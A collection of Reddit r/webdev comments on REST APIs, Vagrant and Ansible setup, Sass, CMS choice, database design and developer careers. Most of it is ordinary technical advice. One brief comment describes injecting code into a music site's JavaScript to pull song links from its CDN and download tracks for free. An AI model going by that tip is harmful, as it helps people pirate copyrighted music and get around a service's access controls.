4005757,0,t3_36b0x0,I seen this question in various forms and I have come to conclude that the people who ask this question dont quite understand what a REST service is and how a browser can be seen as a REST client just as a background process can.OP seems to suggest he has a rendered view of some data in the backend he uses that view in two different places on his website one which uses JS and one which does not.He is now worried that if he moves that template to the frontend he cant use it in two places anymore... which suggest he doesnt quite understand how templates work. The entire idea of a template is that you can use it in two places. Or that he fears adding a JS dependency on part of his site that didnt previously. But hey if JS is required for part of the site anyway why not go the whole way?But I see the move to AngularJS as more fundemental. My website is now more the  one code base.A PHP backend that is no more then a RESTful service. It doesnt know HTML or CSS or JS it just answers calls and responds with JSON.Most of my web applications got a HTML frontend rendered in a browser but most also allow third parties to communicate with the rest service the API.The trick I think is in seeing your own standard frontend as just another API client.I had a discussion before in which someone insisted using React.php to return HTML from the backend instead of JSON. When I then asked how he handled a request for an Android App he suggested using an app that rendered the HTML returned inside it.Which to me is... silly. Because if I then asked him how he would allow a third party application to consume the data he would probably suggest an iframe or similar. Where as I think you would solve all this by creating one API to serve them all. But then I dont do websites I build web applications and the need for an API to allow communication with other applications is often a given.

You need a way to display your work. This still doesnt show an employee your proficiency. I mean Ive written a couple WPF apps I could show you my WPF app and youd be like yea he can write WPF. Reality is assign me some tasks and my productivity will not be what other full time WPF folks might produce. So thats just an experience thing.Also business is a weird deal man.

4241470,0,t3_39i4rf,I dont think any developer has a problem with designers who design. I love them because its one part of the problem I shouldnt have to deal with.But some designers are being asked to be project architects and this is where the frustration comes in.I think we often set up designers to act like architects working on design prototypes and focusing on UIUX before the rest of the project assuming they can consider the problems faced by developers.   Many people become designers rathr than developers because they prefer the visual aspects to the technical programming and data parts of the job. This is fine until we ask them to do work they have chosen not to specialize in.Some companies have designers work on the initial development and then hand it over to the developers.  This is dangerous in a lot of ways.  In this situation the designers do feel like architects.  They draw up the plans and think of the programmer as  the contracter who will do the actual construction.  Well an actual architect has to be good at drawing no doubt. But she also needs to really understand construction.  If the plans dont anticipate how construction happens theyre just drawings.Architecture needs to happen.  But the visual aspects of a project usually take up about  percent of the time and effort and they are always informed by data constraints.  A project architect has to have a decent understanding of all the major parts of the project. In modern web and mobile development Id prefer the overall design to go to a senior person whos finished a lot of projects who has a solid grasp of data coding and design.  This person doesnt need to be able to do all those things but if she doesnt understand parts of the process she should not be leading the project.tldrDevelopers get very frustrated being lead by pointyheaded Dilbert bosses and some firms set up designers in that role.,webdev,cs3px0n,13,t5_2qs0q

By extending the prototype object you enable all jQuery objects to inherit any methods that you add. As established whenever you call jQuery youre creating a new jQuery object with all of jQuerys methods inherited. The idea of a plugin is to do something with a collection of elements.

Material Design does an excellent job of this. You know the little burst out animation when you touch on a button or a link? Sure it looks great but the real reason its there is because its conveying that the application is actually doing something. It compensates for the fact you might not be listening to a touch handler but for click handlers instead  which are slower due to event cascading.There are numerous other examples of this. Not only is it beautiful and enforces a lot of best practices we all know about accessibility w colors responsiveness etc but it also incorporates a lot of perceived performance enhancements.,webdev,csqn9mv,1,t5_2qs0q

4460133,0,t3_3c5u5v,After my last hard drive crash Ive decided Im going to start doing it. The main reason for me is that you cant always do a straight restore after a computer problem notably its often a good time for a clean install with an updated OS and vagrant makes it much easier to get everything set up again. Rather than having to reconfigure my mac install databases updated php versions various developer libraries needed by all that stuff etc I can just restore the vagrant box. Bonus points for scripting it all with puppet  chef so I dont have to even bother with restoring. One of my goals with a computer is to be able to move to a new machine or update the os clean while only having to restore my home directory so vagrant really helps out with that. ,webdev,cssvowq,3,t5_2qs0q

Maybe there are some sectionswidgets that have navigations that also display inline and may behave similarly. It would make sense to separate that navigation out into its own class. Hey I might also want to also replicate this form style somewhere else on my site too so Ill just take all of the styles out and place them into a common forminput class.

Firstly learn how HTTP works. This is fundamental. I am not telling you to read the spec but you should roughly understand how it works. Like how HTTP requests  responses look like that its stateless the major http methods GET POST status codes and the ways a client can pass information to the server request URL including query parameters POST data http headers this is where the cookies are. Secondly do you know how to program? You should start with normal JS before approaching Node. And that nodeauth tutorial is a bad starting point.

A simplified explanation would be that bob wouldnt hit your one database server but it might hit server B because the data is sharding on the first letter so alice gt server A mike gt server M etc.Actually sharding on a letter like that is a crappy choice but thats the general idea.  For users you might start by sticking  arbitrary users on each server and shard by their ID but then you run into issues where one server is way overloaded compared to others yada yada.

4983851,0,t3_3j66ct,Id say youre off to a pretty good start. Youve figured out that JS ! jQuery and youve learned about those scroll sites. Good stuff. Im not sure if I have any specific advice. I avoided bootstrap for a bit because I thought I didnt need it then I decided it was nice to get something decent looking really quick but Ive since moved away from it again because it does more than I need and I end up having to unstyle things. Plus once you get the hang of CSS its actually really easy to get things the way you want and even make it responsive. Maybe start with normalize.css and forget bootstrap.Once youre somewhat familiar with HTML and CSS youll want some form of templating or serverside language. It might not be so important for a singlepage site but as soon as you get to  pages youll find you have repeating form elements and you really dont want to be copypasting the same header and footer everywhere.PHP is probably the easiest to get started with but the internet is also full of a lot of misinformation about PHP because its so popular. Python as the other poster suggests is nice but is bit harder to set up. Django is big framework Im not sure Id jump straight into that. Another popular choice is Ruby but I havent much experience there.A lot of different avenues for you to go. Maybe skim through some introductions and pick the one you like best. You cant go too wrong. Either way youll learn and most of those skills are transferable to other languages.Javascript you will have to learn sooner or later. Its the only way to make anything dynamic or move on the site. A lot of people hate it but I suggest you learn to love it. I actually enjoy it now.

5069038,0,t3_3kewm3,Sass variables are great because You dont need to remember what specific hex or integer or similar you used but can instead refer to them as a primary or secondary color or the width of the content.

Is Lato my body font or my header font? etc. You can pass them to other functions to lightendarkensaturatechange hue etc without having to refer to an external tool. You can use them in combination with each other for better design patters. If something has a height of px and a top offset of px youll probably have a hard time remembering that those numbers have a relation to each other. blockheight and blockheight   is a lot easier to recognize and a lot harder to fuck up in the future.

Youll pick it all up through experience rather than pushing to learn in your down time.No one dev will know everything even the seniors will have gaps in their knowledge  theyve been focussed on things that are relevant to their experience. It seems to be a problem in the tech industry where juniors expect themselves to keep pace with developers who have been doing it  years. It might happen if youre good but youre seriously not expected to be a wizard.If they do expect superhuman levels of commitment  then your bossmanager might be a dick. Most bosses and teams arent though... theyre human after all Comparing yourself to those guys will make you feel out of your depth. Ive been there and I expect  of all developers do exactly the same  but the difference is in the experience. Theyve had similar problems to solve in the past so they can tackle with prior experience that juniors dont have yet!.Imposter syndrome seems to be massively prevalent in tech and it fosters some unhealthy practices in developers both in and out of work.Good luck mate youll be fineKeep it enjoyable dont make your job even more of a job youre not getting paid extra to work in the evening so do something you want to do even if it is dev.,webdev,cvorry9,1,t5_2qs0q

If you stay present and prove your expertise by offering value then when they need work done you will be on their list of people to call.

5520471,0,t3_3qp8aw,Ok Ill bite.  Wall of text coming your way.First create an eyecatching logo.  Your current logo is just an h with text.  It should be an image.  Also you are using more than one h.  The Home h should be your only h.  I would improve that text.  Home is too generic and you have an opportunity to pack it with  relevant keywords.Get rid of the date.  There isnt a good reason to include it.  Move the social icons down next to the search.Pick at least  more font for headlines or navigation.  You dont have to but maybe pick a serif font.  If you arent sure what to choose go with a popular font on Google Fonts.Nothing makes a site look more dated than smalllousy stock images.  Consider going to a  row grid for your  images.  Pick out some better images and be creative with a hover effect.  When the user hovers over the images there should be an overlay with additional information about the link.  Check out Codepen for inspiration.Consider refactoring your HTML.  Im seeing a lot of ltpgtampnbspltpgt scattered about.  It also feels like many of your elements are unnecessarily nested too deep.  Do you really need the innerwrap or primary divs?  If you dont care about supporting IE look into display flex.  It will change your life.The alignment of your h is unusual.  Make it left or center aligned.  I would also drop the underlining on all headers.  Consider replacing it with a bottom border with some bottom padding.  That way you have more control with the styles.  You could change it to a different shade of black.  Also use a lighter shade of black or gray.  Be creative with your colors.Decrease your paragraph widths.  Eye strain is a real thing.  Consider increasing the font size a little bit too.  That should be done on every page.  Again use a lighter shade of black.For most of your pages you would benefit with a more gridlike approach.  On the Studying Tips page for example the water bottle is just out in the middle of nowhere and you have all this empty space in that area in general.  If you want a great example of a simple and clean grid check out this blog   You have your textual content on the left and you have additional content such as links and images on the right.On the contact page consider using HTML form validation.

If I find those Ill update. SwaggerUI is one I do still have around  PHP  Options arent limited but some just produce ugly pages like PHPDoc. DocBook is out since it too produces ugly content and its a pain to setup properly. For PHP API  PHPDox  It requires setting up some additional packages to get the full effect like PHPLOCPHPMessDetectorPHP Code Sniffer  and PHPUnit . Generate a skeleton phpdox.xml and it will list the common generators and install those packages. Use PEAR over the PHAR.   phpxref is old school but might be helpful. Daux.io    this is markdown based and it works ok. More useful for making general docs like a KB. apigen    Uses docblocks to generate API docs. Like phpdoc but has  themes one is bootstrap. Might be an option. dOxygen    This is a desktop app for building docs. It might suit you better than the above tools since it has capability to generate from source code and add additional docs. I use apigen  phpdoc because they have PHING tasks. Might could make Daux.io work with PHING or other build tool but believe its drawback was the fact you had to copy the source directory and directly modify it. Was a deal breaker for me when generating manually. Might be ok with a build tool.  Im sure gruntgulp have tasks for most of these.,webdev,cwlsceu,1,t5_2qs0q

5653336,0,t1_cwxf2fp,At their cores  theyre pretty similar Drupal amp Joomla  or at least used to be.Ive never heard a solid reason to choose Drupal over Joomla however in most general use cases considering Joomla has a much larger user base lower barrier to entry not as steep of a learning curve and has far more extensionspluginscomponents out of the box that do what the user needs.  Thats important because then you can install the site without relying on additional modules programmed by other people that maymay not be updated in an appropriate fashion to stay up to date with code changes to the core system.  While Drupal has more modules it is that way because those things are not included out of the box and have to be added and again  theyre created by others.  So you have to actually look at their module to decide if its programmed well or a total shitpit.Ive developed on all  major CMS platforms  for blogs?  Wordpress.  Far and away its the easiest for the basic simple site that a user can editchangeupdate.  For everything else that tends to need the benefits of a CMS  I tend to go with Joomla.  For something thats really custom and Ill be writing a lot of code for anyway?  Then and generally only then will I hit up Drupal.

5747096,0,t3_3tu0o9,If your API is for a POST request meaning youre creating a new entity on the server I think that a request without all the required information would be considered malformed and would warrant a  response maybe with a message that the request was missing information. This would probably apply too for a PUT request as well updating and replacing the contents of an entity on the server. Why allow the possibility that you may have malformed data in your database? If youre ever doing a PATCH request though partially updating an entity that already exists on the server then Id say its okay to not do validation on the fields that are included in the request.

5764302,0,t3_3u2yk0,This is exactly what vagrant is for. There is definitely a learning curve to it but once you are setup its amazing. Please do not get discouraged at the initial difficulty of setting things up. It absolutely will be frustrating until you understand whats going on. If you want to separate yourself from other developers this is a great way to do it. Most developers have no idea how to do this or even setup a server manually. Its an excellent skill to learn as you dont have to rely on anyone else to get your apps up and running live.Youll also need to look into provisioning your VM. You can do this with your own bash scripts but I would highly recommend looking into something like Ansible for provisioning. There are other tools such as Chef and Puppet but ive found Ansible to be immensely easier to use.Once you get Vagrant and provisioning setup you can simply vagrant up and your entire environment will be built for you. You will also be able to version control this so you can share it with any other developers and they can have the exact same environment with a simple vagrant up command. Here is a simple ansible script written in yaml that installs node         name Download node.js binary tarball      geturl url desthomeansibleuserid      sudo yes      tags nodejs     name Unarchive node.js tarball      command tar xzf homeansibleuseridnodev..linuxx.tar.gz C usrlocal      sudo yes      tags nodejs     name Add usrlocal symlink to unarchived tarball      file srcusrlocalnodev..linuxx destusrlocalnode statelink      sudo yes      tags nodejs     name Add .profile with updated node path      template srcprofile desthomeansibleuserid.profile      sudo yes      tags nodejs     name Delete tarball      file pathhomeansibleuseridnodev..linuxx.tar.gz stateabsent      sudo yes      tags nodejs      name Install pm     npm namepm executableusrlocalnodebinnpm globalyes     sudo yes     tags nodejsNow you never have to manually do that again. You can just run a simple ansible command and install it. Better yet connect it to your vagrant file and it will do it automatically on vagrant up or you can invoke it with vagrant provision    config.vm.provision ansible do |ansible|        ansible.playbook  provisioningvagrant.yml    end,webdev,cxbm5b0,3,t5_2qs0q

5851598,0,t1_cxmhyz4,Fair enough. The reason relational databases tend to separate out data into multiple tables is remove redundancy via Normalization Take for example a situation where you have an order record and it may have an item id. It would easy to store the item name and price in the order instead we store id and reference the other table so multiple orders can share the same id. If we need to update the item name we do it one place instead of multiple orders.This of course isnt to say that relational databases work for everything but they do scale up and have worked well in many situations but in others a nosql solution is better.The thing about data is it needs very careful thought. Its not just about heres a json object save it. That works fine for smaller apps and prototypes but large apps need a lot of attention to how data is stored how fast its retrieved and how you can report against that. Thats why there are people whos entire job is focused on data Data Architects DBAs DBEs  Data Modellers. the way data is organized has a big impact on large scale applications.,webdev,cxmo85k,1,t5_2qs0q

5927725,0,t3_3wh58x,For me it comes down to solving problems. Every new ticket that enters my queue I treat as a blank slate. Its an opportunity to solve a problem or a puzzle and its up to me to find the most elegant and simple solution I can. I have a check list of steps I go through and I find great satisfaction in this.I review the task carefully and patiently. I make sure I understand exactly what the requirements are before beginning. If the task requires using a third party library I take my time and read through the documentation for that library carefully and thoroughly until I understand it. Sometimes I write out all the steps I need to go through all the individual requirements in order to implement the feature properly. I do all of this before writing a single line of code.When Im done my preparation which I dont consider boring because I associate it with being a good developer and producing the best result as efficiently as possible I am left with a feeling of confidence and sometimes excitement. I know the api now I understand the tools at my disposal and I have a model in my head for how everything is going to fit together. Im eager to put it all in place. The thoroughness provides its own satisfaction. The learning is pleasurable and often times I will discover useful api features I wasnt aware of that greatly simplify my task.At this stage I will briefly review my plan and possibly refine it architecturally. Then I will write some tests. But tests are not laborious. Ive found that I can write some very simple tests that describe a success state in the simplest and most obvious way possible. Furthermore writing the tests forces me to think about creating the simplest api possible the most testable code I can come up with. Who wants to test a class where a dozen dependencies need to be mocked? Agony.  A test should nudge you towards simplicity and good design decisions. If your test is painful and tedious then something is wrong in your design. Finding a simple solution is tremendously satisfying.Then I make my test pass. Usually I do this with a stub. For example Ill return exactly the value I expect from my api. This forces me to think about edge cases and other scenarios exception states etc. I write more failing tests. As soon as your method needs to return a different value for a different input youre cooking. Ill then implement my method and class properly make my tests green do a quick manual test for sanity and then...Time permitting Ill take a step back and review what Ive done. I will put on my refactoring hat and look for code smells duplication feature envy etc. Ill move code around rename methods notice problems in some adjacent code and just generally polish everything. Ill make sure my tests pass. Ill document my code which I consider a gift to my future self. And then Ill commit and Im done! On to the next feature!This sounds like a long process but with practice it can be quite fast. When you change your attitude towards the work valuing thoroughness and code quality you can derive tremendous satisfaction from a job done immaculately and well. There is joy to be found in the feeling of approaching any problem with an ironclad inexorable process of problem solving. You become confident in your abilities and you discover a limitless depth of creative expression in the subtle details of how you approach your solution and how you deign and write your code.I hope this helps!,webdev,cxwnmjc,2,t5_2qs0q

I guess the reason why I brought this up was because there was a site with a similar idea called plug.dj that had to shut down because they couldnt cover server costs. I figured that these costs were based off of all the data that was being transferred simultaneously I actually have no idea what I am talking about here but the server costs were attributed to the AMOUNT of people on the site then?This is probably quite easy to google but would the process of transferring hosting companys be fairly straight forward IF the site outgrows my current plan?

Anything needed NOW! gets done when triggered by a PHP script. If everything responds quickly then caching for most things is just unnecessary overhead. I specifically try to preprocess to simplify database intensive stuff generate a static JSON object of an invoice that wont be modified anymore for instance. I will use a cron job to query as many MySQL servers as I need than turn the results into a JSON string and stuff the it into a single row of a different DB table. That data comes out of the active tables and the active tables are faster for it.I try to keep stuff responding quickly in the most vanilla way possible. That means horizontally scaled web servers for the REST API and more DB servers with few records and fewer tables sharding second to when more servers isnt a workable solution.I had at one point in time to monitor pricing on Amazon. They have a product advertising API that you can utilize and I would store pricing a few times a day. This table was millions of lines. I ran a cron job that dumped specific cross sections of that data into other tables. The first thing was to nix any rows that were not associated with items currently in the warehouse for the last  days now we are down to a data subset of  or so last I was in charge of it. From that  I could get the last two weeks and again for the last week which was the set of metrics most used. However the end resulting table only had a few thousand rows in it snappy as you could hope for. Run every three hours it ate up disk space but the server was bogged down for less than an hour each day. The server is real slow. Go get a cup of coffee or check your email. Hey its faster again thanks! No problem.

6095129,0,t3_3yzk5p,For local testing I suggest a LAMP stack using Virtualbox and Vagrant. This video goes through the setup on Windows. You can use the scripts referenced in the video or you can use something like PuPHPet to generate your own. Your websites URL will be  during dev unless you configure the hosts on your computer then you can customize it like mydomain.dev or mydomain.loc. Still youre the only person that can see it and those domains arent real.When its time to upload to a webhost and have your real domain point to it probably the easiest way is to use a shared host like Dreamhost and just FTP or Git Push the files there. Most shared hosts will have phpMyAdmin and I know Dreamhost has Git installed and allows SSH . Theyre around  a month and you can have as many domains as you want on the same account it just treats them as separate root folders.If your site starts getting tons of traffic it might be time to go for a more pro option like Amazon AWS. Get practice with tweaking your local LAMP stack and moving from the shared host will be mostly straight forward.,webdev,cyigc0r,3,t5_2qs0q

6109485,0,t1_cyk18u5,So I have Backbone stickers on my laptop I used to love it... I totally bought into the lean minimal aspect of it... but then I noticed I was just writing the same code over and over and over again. Once I started to use newer frameworks they just felt more done than backbone. And I know it gives you allot of control but frameworks like react have put so much work into optimising DOM updates to make them as fast as possible and you miss all of that with backbone. With backbone you have to implement your own DOM rendering based on its event system. The code for this ends up being prone to memory leaks if you forget to unbind event listeners. Another thing I used to love about backbone was that it included underscore.js which I used to use for just about every project. But Underscore.js has become largely irrelevant as most of its most useful methods have now been built into native javascript arrays map reduce filter ect. Backbone sort of laid the groundwork for modern front end frameworks but overall it has fallen behind. There are still allot of companies out there with code written in it they have to maintain so if you want to learn it to pad your resume by all means but overall Id go with something like React or Angular. Personally I have been using vue.js latelly and I love it. ,webdev,cyk33t8,2,t5_2qs0q

6121602,0,t1_cylgh0q,I wanted to know whether someone here uses this. The part I liked wasgt As you can see the backend web application can either respond to an HTTP request normally or it can respond with holding instructions and send data down the connection at a later time. Either way the backend never maintains longlived connections on its own. Instead it is Pushpins job to maintain longlived connections to clients. HTTP streaming and WebSockets are handled in a similar fashion.It looks like the monetization plan of the authors of pushpin is to release the code but charge for a cloud service Which sounds okay but I also want to understand whether the cloud has some premium mustpay feature or if everything is actually open source.,webdev,cylgntn,2,t5_2qs0q

6181796,0,t3_406uh1,We have transitioned over time. Ill give you the story of one of our longestrunning sites.In the beginning it was CVS! just rolling straight out to the live server from dev machines. Our dev machines were kind of like live but no one really checked package versions etc. The dev machines ran a different flavour of Linux to the live machine.This was replaced by SVN which was replaced by Mercurial. We standardised on one flavour of Linux. We began going via a test server to live but not technically staging as it wasnt set up in quite the same way as live. We also began scripting dev VM setup with a load of shell scripts to fetch code instal the right package versions etc. We then switched to using a staging server set up identically to live with a few key differences and switched to Git around the same time. Began running loads of Jenkins tests on various test VMs both by hand before deployment and nightly. We also began building the website code as a Debian package and had a build server to create the package and roll that out. We then switched to using Ansible to build the Debian package. Wed have a command and control machine which would do all of the logging in etc. and wed trigger this using Jenkins.  We now use Vagrant to bring up dev VMs locally and once weve pushed our commits we can run a suite of tests via Jenkins. Once these pass we use Ansible to roll out the tested package to staging retest in as close to a live environment as we can and then out to the live servers.Anyone who is a novice at building websites and has to get their head around Git PuppetChefAnsible Jenkins or some other CI solution and then DockerVagrant gets some serious respect from me. The tooling these days is great although as a result there is a lot to learn. Weve introduced all of it by doing the simplest thing first and then improving our processes. We saw the need for it and brought it in. I think this is the best way for any development team to proceed. For a lone developer say a freelancer I would urge this approach even more.,webdev,cysb0ps,3,t5_2qs0q

Django signals are synchronous for example a postsave signal is called when a model is saved in the same thread before continuing with the next line of code after model.save. Signals are for organizing source code in a more modular way but they dont provide a background job queue.For background jobs two options would be Write a custom django management command  a command line script and call it from usual cron. Works perfectly well if you want to run it every day or every hour. Install and run an asynchronous job queue. These listen for messages from the web server and run functions in another process. You can react to messages as soon as possible without tying up the web server or add delays or add regular scheduled jobs etc. The popular options include  Celery  Very featurerich and configurable but a bit tricky to deploy.

See the Node Hackathon Starter for solid defaults Rails is pretty great for a monolithic CRUD app where templating is done server side though those are less used these days Ruby has clean simple syntax Rails has a ton of default middleware to pump out a web app its slower than newer frameworks Node PhoenixElixir but for most purposes it doesnt really matter Id play with React and React Native or Angular  just make sure your app benefits from MV Golang is pretty great  its stable and fast and makes multithreading fun. The big tradeoff is the lack of libraries compared to Node or Ruby or Python. For editor Emacs or Vim if you have the time to learn SublimeAtom if you want something GUIoriented and one of the Jetbrains ones if you want a full IDEIf youre looking to learn one for a job Id recommend Node or Phoenix and React or Angular as the newer ones that have some buzz and seem like theyll grow.

We are talking same features different engine here.I have seen countless game mods where they strip the whole game engine and replacing it altogether with another one but the game functions the same.My point is that in the end its just a build switch.

Just register with recruitment agencies and post your site onto a few jobs boards monster is a good one and if you are in the UK the also use CWJobs ITJobsBoard and JobServe they will do pretty much all of the work for you so you can just sit back and wait for the phone to ring.Expect lower day rates as a new starter though even if you are experienced in your job new contractors are often given lower rates.Freelancing is another ballgame entirely though to me contracting is working on the client site freelancing is you working on a project from wherever you choose to be.

If you write a bit of code into their JS file then you can log the information sent by the API. If you then look into the API response you can see the link to the CDN that is actually serving up the songs. Follow that link right click save and boom! You got yourself some free songs.

As a practical business reality the value of marks that are not policed and their associated goodwill are always in danger.  gt Sourcegt However trademark rights can also be lost unintentionally. For example in some countries it is possible to lose rights in a mark by allowing third parties to use the mark without controlling how it is used.  gt Sourcegt Delay in filing infringement lawsuits when you are aware someone is using your trademark gives rise to a legal concept known as laches which effectively means that you are locked out of asserting your rights for failure to act in a timely fashion.  gt SourceOr as worded by the US patent and trademark officegt Throughout the life of the registration you must police and enforce your rights.  gt SourceSince they not only were going to publish a package to NPM but also had already acknowledged the existance of the infringing package they were essentially risking their trademark. From a business standpoint they quite literally had no choice but to get the package renamed or taken down whether through a compromise or by legal force after the very first email.,webdev,d1b38fc,7,t5_2qs0q

I could see the instructions being more vague build a node.js survey and asking for a README  but they essentially wrote a spec list of requirements the readme would essentially be that list backwards more or less. Keep in mind everything is procon in the world. If the OP has  hours to burn then this would be worth while to apply. But if the OP already has a job then his time might be better spent elsewhere. His only question was if this typical and of all the jobs Ive applied for and all the applicants Ive reviewed Ive never asked them to build an app with a README I have asked to see a sample of their code with comments.

Many of the founders have since moved to trails.js...because javascript.  Either would automate much of the process and the other nice thing is that it can abstract your database while you figure things out. I think by default it writes to a text file but you can change the adaptor to write to mongo or postgres and it just works.In my experience mongo is not a good choice for anything Ive worked on see document vs relational database and depending on exactly what you want to do it might not be for you either.

7103575,0,t3_4crj2r,I too was in the same situation as you having only been exposed to Java C C and not much experience in web dev. I found it overwhelming trying to move into web dev so I decided to research all possible avenues to get me started.The big decision for me was deciding whether to use PHP or ASP.net. There are many pros and cons to each with financial costs and learning curves being some of them. But having come from a C background I found working in ASP.net and C much more comfortable than using PHP which was a nightmare for me to get into. So seeing that you have a C background I would highly recommend you first learning ASP.net MVC which I found very easy to settle into.The next step in your journey to getting started would be to take on a project dont fear that you dont know enough web dev to start a project just dive straight into it you will be surprised at how much you will learn just by Googling what confuses you. Many backend developers struggle with getting a frontend up and running however this is made very simple thanks to Twitter Bootstrap. Bootstrap is very easy to use if you know just the basics of HTML and CSS. All you have to do is add it to your project and call it in your HTML as required. There are also many bootstrap templates available online for you to download and use.The third big thing would be to learn some javascript all you need is the basics and the rest can be figured out given that you already know how to program in C. jQuery is easy to catch on so as you come across issues to solve in your project youll realise theres a jQuery function that will do it for you just by invoking the function.Thats pretty much it once you get the ball rolling and stick to the languages and technologies of your choice web development can be really exciting and simple.

7154752,0,t3_4dhtv7,Ideally you want  monitors or more to be able to cleanly keep an eye on  things at the same time ie. your browser and your editor or  editors without having to squeeze them side by side. However thats rarely really needed and you can make do with switching around multiple desktops most of the time ie. its rarely that the cognitive load lifted by seeing  things next to each other makes a real difference in your productivity. I frequently work from my  inch laptop which isnt an ultrabook and it has been fine. Apart from the screen thing I find the touchpad to be comparable to a mouse less accurate when trying to click something specific or select text but moving from and to the keyboard is much less of a slowdown.  I appreciate the freedom of working from a sofa or moving around freely so laptops are great to work with but Id look around for something that allows me to connect  external monitors to get the best of both worlds because I find using the built in monitor along with another external one a very bad experience for my own productivity.

There are other ways like socketio but what youve described is generally considered best practice.gtIs it perhaps overkill and it can all be done in the website code depending on how much work needs to be done?Its only overkill if you dont need a database.  If its static data you could leave it in the front end and never hit a backend server.gtI guess my main question is how to best connect the front end to the back end.RESTful services!  Basically what you said.  Sending messages over HTTP but using GETPOSTPUTDELETE correctly.gtLike AWS they host the webpage and the back endThats definitely an option.  If you open up CORS you can host the backend wherever you want.gtare these on the same servers andor are they connected with http requests like I was saying or something else?Yeah thats super common.  You can always throw your front or back end into load balance if you need.  you can get super fancy with deployment containers and VMSgtThis kinda leads me to my next question what is the easiest way I can get something up and running to start messing around with this. My first idea is locally host a webpage and run a python program and hit it with http requests would this setup easily translate into one of the hosting services?It sounds like you may be good fit for Django its a nice library for building simple web apps.

7234603,0,t1_d200rft,You know I switched to Mac long before I started doing any Ember work. And it was because I was getting these sorts of issues constantly with PHP as well especially with tools like composer and artisan. I had to battle Windows security features constantly. I had issues with file paths being too long in nodemodules and varied permission issues. I had version conflicts on tools I had to install  like Ruby  and was constantly looking for workarounds to little glitches. Again... long before Ember CLI. All of this shit just went away once I started using a Mac. Its not the tools. Ember CLI is a modern development tool. It requires a modern development environment. It doesnt work well on Windows.

7330565,0,t1_d2b8slq,IMO all of them. Those are the minimum requirements for an SPA right? But an actual production app has a huge amount more complex needs than that. Theres authentication and state management and data handling persistence async handling testing and its inherent concepts like mocking etc date formatting deployment templating promise management offline support... How many of these things should be part of the core... Im not sure where that line needs to be drawn. But I know I would draw it significantly after just providing a ViewModel layer. Even the ability to just add a router doesnt really  IMO  take us to best practice for SPA development.Something like Ember provides a lot more than those basics. The CLI provides comprehensive build tools all code is ES dependency management as well as productivity.We can do so much now. Its faster and easier to use good frameworks.,webdev,d2bfooy,1,t5_2qs0q

Then he is likely going to comment that the weather forecast did not say anything about rain then you tell him it is not about the if it is about the when.

7340545,0,t1_d2cc4ce,Start with the front end. Lots to learn just there but its pretty simple and mostly just memorizing what tag does what. Front end languages are HTML CSS and Javascript. Learn them in that order. If you dont have a solid understanding of HTML learning CSS will be more difficult. If you dont have a solid understanding of HTML and CSS Javascript will be more difficult to learn.Dont move to backend until you can code a frontend website with your eyes closed. Compared to learning a true programming language frontend languages are a cakewalk.Then pick a backend language. PHP is pretty beginnerfriendly but Python Ruby and Node.js are popular choices too.There are lots of free tutorials online no need to visit a library. Just Google learn chosen language here. Laracasts is good for PHP Learn Python the Hard Way for Python and I havent used Ruby or Node.js but Im certain theres an equivalent tutorial series for them as well.Dont worry much about the IT side of things like systems administration setting up servers and securing them. Pick a good managed host and let them handle it. If you reach a point where you need anything more complex than that youll probably need someone who specializes in system administration anyways.This is the basic roadmap for getting started as a full stack developer. If you rush through and skip parts trying to build a particular website too quickly youll just shoot yourself in the foot. Becoming a full stack developer isnt easy or quick but if you enjoy learning and you enjoy programming its incredibly rewarding.Good luck!,webdev,d2ckj2o,1,t5_2qs0q

7368595,0,t3_4g8x78,For a nonprofit I would try making the software open source under a free license like GPL or MIT. Market it as an open project that will benefit humankind and try to get programmers to contribute time out of altruism. So I would basically focus on the meaningful purpose part and also focus on what skills and infrastructure you have brought and will continue to bring to the project. If a programmer could just make the program himself without answering to you if you dont bring any value as a work partner he will. So focus on what youve accomplished already.Potential earnings in the future may actually have the opposite effect and drive programmers away. Firstly any experienced programmer will tell you that the phrase is meaningless a bird in hand is worth two in the bush. Secondly it subconsciously makes your company feel like a forprofit even if you are a nonprofit in reality well pay you when were profitable and a good programmer knows that they should never work for a forprofit business for free.,webdev,d2frb1n,3,t5_2qs0q

A Qpadmksomethingorother I got second hand off ebay Coolermaster Masterkey SIll only talk about the Coolermaster because I love it and the other one is kind of meh.The first thing I like about it is that its built like a tank. Some of the cheap keyboards Ive had in the past feel like they have a bit of give in them this thing feels like its part of the desk.Second it has no numpad meaning that my right hand is closer to my mouse. I have a separate numpad for when I need it which is pretty rare.Third Cherry MX browns. Id love to have clickly blues but I dont want my coworkers in the open plan office to bludgeon me to death with my own keyboard so I settle for the quieter browns. The clicky and heavy nature of the keys give your fingers and your ears a lot of feedback its the same reason people like the Apple keyboards... just chunkier.Four Macro keys. Still finding uses for these but they are best used to replace having to touch the mouse.Finally and most importantly I can play snake using only my keyboard backlighting LEDsEdit Check out rmechanicalkeyboards if you want an expensive and ultimately pointless hobby.,webdev,d30ijv8,5,t5_2qs0q

My former company has  actual users in its oraganization but when they went to try the upgrade it listed  users total meaning all collaborators from other agencies and clients who have individual repo access end up counting as well apparently.It seems really strange that collaborators invited only to specific repositories end up counting as billable users...Would anyone else be able to confirm this? It could be a bugover sight on GitHubs part or my former company messed up and added those collaborators as full organization users.EDIT just confirmed that my former company does only have  people and  nonmembers with repository access  so its set up correctly but GitHub is counting it as  total and quoting it as month. They have to pay month for users that have collaborator access to just one or two repositories. MASSIVE ripoff....At least theyre transparent about it...,webdev,d318hzq,31,t5_2qs0q

Furthermore I could probably be relatively effective within a week.This extends to frameworkslibraries as well.I also think that the structure of a project is far more important than the underlying technologies. Which is a far harder skill to master than a single programming language.I would suggest that you instead focus on becoming a better programmer instead of learning specific languages technologies or frameworks. Forget the buzzword frameworks there is a good chance they will be forgotten within a few years anyway. A skilled programmer is far more sought after than an Angular expert.To give you a real life example I have been lucky enough to receive  job offers in the last couple of months.

Now my host machine can connect to Postgres on localhost and Redis on localhost without those services having to be installed on my host machine but instead run inside a container that can be destroyed at any point just like a Vagrant machine.Anyhow you should try it out before you judge it.,webdev,d4f2efx,3,t5_2qs0q

Without that signature the employer cant prove an agreement exists. And with no agreement a contact hasnt been formed.

